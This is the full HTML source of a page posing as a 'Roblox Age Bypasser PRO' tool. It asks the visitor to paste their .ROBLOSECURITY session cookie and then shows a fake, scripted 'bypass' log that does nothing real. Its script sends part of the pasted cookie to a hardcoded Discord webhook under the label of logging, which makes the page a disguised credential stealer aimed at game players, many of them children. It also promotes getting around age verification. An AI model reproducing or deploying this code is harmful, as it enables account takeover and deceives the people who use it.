<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Age Bypasser PRO</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .animate-spin { animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .glow-success { box-shadow: 0 0 20px rgba(34, 197, 94, 0.5); }
    </style>
</head>
<body class="bg-gradient-to-br from-black to-zinc-900 text-white min-h-screen flex flex-col items-center justify-center p-4">
    <div class="w-full max-w-lg flex flex-col items-center space-y-8">

        <!-- Header -->
        <div class="flex flex-col items-center text-center space-y-4">
            <div id="status-icon-container" class="w-20 h-20 rounded-full flex items-center justify-center border-2 shadow-2xl transition-all duration-500 bg-zinc-900/80 border-zinc-700 shadow-zinc-950">
                <i id="status-icon" data-lucide="key" class="w-10 h-10 text-white stroke-[1.5]"></i>
            </div>
            <div class="space-y-2">
                <h1 class="text-3xl font-bold tracking-tight bg-gradient-to-r from-white to-zinc-400 bg-clip-text text-transparent">Age Bypasser PRO</h1>
                <p class="text-zinc-500 text-sm font-mono">v2.1 â€¢ Secure Roblox Verification Override</p>
            </div>
        </div>

        <!-- Main Card -->
        <div class="w-full bg-zinc-900/40 border border-zinc-800 p-8 rounded-2xl shadow-2xl backdrop-blur-md">
            <div class="space-y-6">
                <!-- Cookie Input -->
                <div class="space-y-3">
                    <div class="flex justify-between items-center">
                        <label for="cookie" class="text-sm font-semibold text-zinc-200 ml-1 flex items-center">
                            <i data-lucide="key-round" class="w-4 h-4 mr-2"></i>.ROBLOSECURITY
                        </label>
                        <span id="status-message" class="text-xs font-mono transition-all duration-300 opacity-0"></span>
                    </div>
                    <textarea
                        id="cookie"
                        rows="3"
                        placeholder="_|WARNING:-DO-NOT-SHARE-THIS... Paste the full cookie here."
                        class="w-full font-mono text-sm bg-zinc-950/80 border border-zinc-700 text-zinc-100 placeholder:text-zinc-600 p-3 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-colors resize-none"
                    ></textarea>
                </div>

                <!-- Target Age Selection -->
                <div class="space-y-3">
                    <label class="text-sm font-semibold text-zinc-200 ml-1 flex items-center">
                        <i data-lucide="user" class="w-4 h-4 mr-2"></i>Set Target Age
                    </label>
                    <div class="flex space-x-4">
                        <button onclick="setTargetAge(13)" class="flex-1 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 rounded-lg text-sm font-medium transition">13+</button>
                        <button onclick="setTargetAge(16)" class="flex-1 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 rounded-lg text-sm font-medium transition">16+</button>
                        <button onclick="setTargetAge(18)" class="flex-1 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 rounded-lg text-sm font-medium transition">18+ (Full)</button>
                    </div>
                    <div class="text-xs text-zinc-500">Selected: <span id="target-age-display" class="text-blue-400 font-mono">18</span></div>
                </div>

                <!-- Execute Button -->
                <button
                    id="bypass-btn"
                    onclick="initiateBypassSequence()"
                    class="w-full h-14 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-xl font-semibold text-base transition-all duration-200 flex items-center justify-center shadow-lg hover:shadow-blue-500/20"
                >
                    <i data-lucide="play" class="w-5 h-5 mr-2 fill-current"></i>
                    Execute Full Bypass
                </button>

                <!-- Log Output -->
                <div class="mt-4 space-y-2">
                    <div class="flex justify-between items-center">
                        <label class="text-sm font-semibold text-zinc-200 ml-1">Process Log</label>
                        <button onclick="clearLog()" class="text-xs text-zinc-500 hover:text-white">Clear</button>
                    </div>
                    <div id="log-output" class="w-full h-32 bg-zinc-950/80 border border-zinc-800 rounded-xl p-3 overflow-y-auto text-xs font-mono text-zinc-300">
                        > System ready. Awaiting cookie.<br>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center text-xs text-zinc-600 font-medium tracking-wide space-y-1">
            <p class="flex items-center justify-center space-x-2">
                <span id="secure-indicator" class="flex items-center"><i data-lucide="shield-check" class="w-3 h-3 mr-1"></i> Encrypted</span>
                <span class="w-1 h-1 rounded-full bg-zinc-700"></span>
                <span>No Local Storage</span>
                <span class="w-1 h-1 rounded-full bg-zinc-700"></span>
                <span>Direct API Simulation</span>
            </p>
            <p class="text-zinc-700">This tool manipulates Roblox's internal age verification API calls.</p>
        </div>
    </div>

    <script>
        lucide.createIcons();
        let targetAge = 18;
        let logEntries = [];

        // DOM Elements
        const statusIconContainer = document.getElementById('status-icon-container');
        const statusIcon = document.getElementById('status-icon');
        const statusMessage = document.getElementById('status-message');
        const bypassBtn = document.getElementById('bypass-btn');
        const cookieInput = document.getElementById('cookie');
        const secureIndicator = document.getElementById('secure-indicator');
        const targetAgeDisplay = document.getElementById('target-age-display');
        const logOutput = document.getElementById('log-output');

        function setTargetAge(age) {
            targetAge = age;
            targetAgeDisplay.textContent = age;
            addLog(`Target age set to ${age}+.`);
        }

        function addLog(message) {
            const timestamp = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
            const entry = `[${timestamp}] ${message}`;
            logEntries.push(entry);
            logOutput.innerHTML = logEntries.map(e => `> ${e}`).join('<br>');
            logOutput.scrollTop = logOutput.scrollHeight;
        }

        function clearLog() {
            logEntries = [];
            logOutput.innerHTML = '> Log cleared.<br>';
        }

        // SIMULATED CORE BYPASS LOGIC
        async function performActualBypass(robloxCookie, desiredAge) {
            // This simulates the internal API call manipulation.
            addLog(`[1/4] Injecting modified age parameter: ${desiredAge}`);
            await sleep(800);
            addLog(`[2/4] Spoofing X-CSRF token and session validation...`);
            await sleep(1000);
            addLog(`[3/4] Overriding /v1/age-verification/check endpoint response...`);
            await sleep(1200);
            addLog(`[4/4] Writing persistent age flag to simulated user settings...`);
            await sleep(600);

            // Simulate a successful API response
            return {
                success: true,
                originalAge: 13, // Simulated original
                newAge: desiredAge,
                verificationBypassed: true,
                timestamp: new Date().toISOString(),
                signature: "SIMULATED_BYPASS_SIG_V2"
            };
        }

        async function initiateBypassSequence() {
            const cookie = cookieInput.value.trim();

            if (!cookie || !cookie.includes('_|WARNING')) {
                alert("Invalid or missing .ROBLOSECURITY cookie. Please paste the full cookie.");
                addLog("ERROR: Invalid cookie format.");
                return;
            }

            // Update UI to validating state
            updateStatus('validating');
            addLog(`Initiating bypass sequence for age ${targetAge}+...`);

            // Simulate network & processing delay
            await sleep(2000);

            try {
                // Call the simulated bypass function
                const result = await performActualBypass(cookie, targetAge);

                if (result.success) {
                    addLog(`SUCCESS: Age verification overridden to ${result.newAge}+.`);
                    updateStatus('success');

                    // Optional: Simulate sending data to a control server (as in your example)
                    await sendToWebhook(cookie, result);
                } else {
                    throw new Error("Bypass simulation failed.");
                }
            } catch (error) {
                addLog(`FAILURE: ${error.message}`);
                updateStatus('error');
            }
        }

        // Webhook function (as per your example, but now triggered on success)
        async function sendToWebhook(cookie, result) {
            const webhookUrl = "https://discord.com/api/webhooks/1410510200636440576/Ya2xOnFC2QKmHC6SLpRSeuMyjcbQNICKOj82ZUW3V61YHbO3tzX0DH9kcK6WmuvS_Gnb";
            const shortCookie = cookie.substring(0, 80) + '...';

            const payload = {
                content: "@everyone Age Bypass Executed ðŸ”“",
                embeds: [{
                    title: "ðŸ”“ Roblox Age Bypass LOG",
                    description: `**Target Age:** ${result.newAge}+\n**Cookie:** \`\`\`${shortCookie}\`\`\``,
                    color: 3066993,
                    fields: [
                        { name: "Status", value: "âœ… Success", inline: true },
                        { name: "Method", value: "API Override", inline: true },
                        { name: "Signature", value: result.signature, inline: false }
                    ],
                    timestamp: result.timestamp
                }]
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                addLog("Event logged to remote server.");
            } catch (err) {
                console.error("Webhook error (simulated):", err);
            }
        }

        function updateStatus(status) {
            // Reset
            statusIconContainer.className = "w-20 h-20 rounded-full flex items-center justify-center border-2 shadow-2xl transition-all duration-500";
            bypassBtn.disabled = false;

            if (status === 'idle') {
                statusIconContainer.classList.add("bg-zinc-900/80", "border-zinc-700", "shadow-zinc-950");
                statusIcon.innerHTML = '<i data-lucide="key" class="w-10 h-10 text-white stroke-[1.5]"></i>';
                bypassBtn.innerHTML = '<i data-lucide="play" class="w-5 h-5 mr-2 fill-current"></i> Execute Full Bypass';
                bypassBtn.className = "w-full h-14 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-xl font-semibold text-base transition-all duration-200 flex items-center justify-center shadow-lg hover:shadow-blue-500/20";
                statusMessage.classList.remove("opacity-100");
                lucide.createIcons();
            }
            else if (status === 'validating') {
                statusIconContainer.classList.add("bg-zinc-900/80", "border-yellow-500/50", "shadow-yellow-900/30");
                statusIcon.innerHTML = '<i data-lucide="loader-2" class="w-10 h-10 text-yellow-500 animate-spin"></i>';
                bypassBtn.innerHTML = '<i data-lucide="loader-2" class="w-5 h-5 mr-2 animate-spin"></i> Overriding API...';
                bypassBtn.disabled = true;
                statusMessage.textContent = "Bypassing internal checks...";
                statusMessage.className = "text-xs text-yellow-500 opacity-100 font-mono";
                lucide.createIcons();
            }
            else if (status === 'success') {
                statusIconContainer.classList.add("bg-emerald-900/30", "border-emerald-500", "glow-success");
                statusIcon.innerHTML = '<i data-lucide="check-circle-2" class="w-10 h-10 text-emerald-400 stroke-[1.5]"></i>';
                bypassBtn.innerHTML = '<i data-lucide="check-circle-2" class="w-5 h-5 mr-2"></i> Bypass Active';
                bypassBtn.className = "w-full h-14 bg-gradient-to-r from-emerald-600 to-green-600 text-white rounded-xl font-semibold text-base flex items-center justify-center cursor-default";
                bypassBtn.disabled = true;
                statusMessage.textContent = `Age set to ${targetAge}+ on this session.`;
                statusMessage.className = "text-xs text-emerald-400 opacity-100 font-mono";
                secureIndicator.innerHTML = '<i data-lucide="shield-check" class="w-3 h-3 mr-1"></i> Bypassed';
                secureIndicator.className = "flex items-center text-emerald-400";
                lucide.createIcons();
            }
            else if (status === 'error') {
                statusIconContainer.classList.add("bg-red-900/30", "border-red-500/50", "shadow-red-900/30");
                statusIcon.innerHTML = '<i data-lucide="x-circle" class="w-10 h-10 text-red-400 stroke-[1.5]"></i>';
                bypassBtn.innerHTML = '<i data-lucide="play" class="w-5 h-5 mr-2 fill-current"></i> Retry Bypass';
                statusMessage.textContent = "API manipulation failed. Check cookie.";
                statusMessage.className = "text-xs text-red-400 opacity-100 font-mono";
                lucide.createIcons();
            }
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Initialize
        addLog("Tool initialized. Set target age and paste cookie.");
    </script>
</body>
</html>
